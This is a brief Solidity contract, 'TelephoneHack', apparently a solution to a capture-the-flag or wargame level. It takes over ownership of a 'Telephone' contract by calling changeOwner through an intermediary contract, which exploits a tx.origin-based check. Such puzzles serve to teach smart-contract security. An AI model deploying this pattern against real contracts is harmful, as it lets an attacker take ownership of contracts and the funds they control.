// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneHack {

    Telephone public targetContract;

    constructor(address _targetContract){
        targetContract = Telephone(_targetContract);
    }

    function ChangeOwner(address _owner) public {
        targetContract.changeOwner(_owner);
    }
}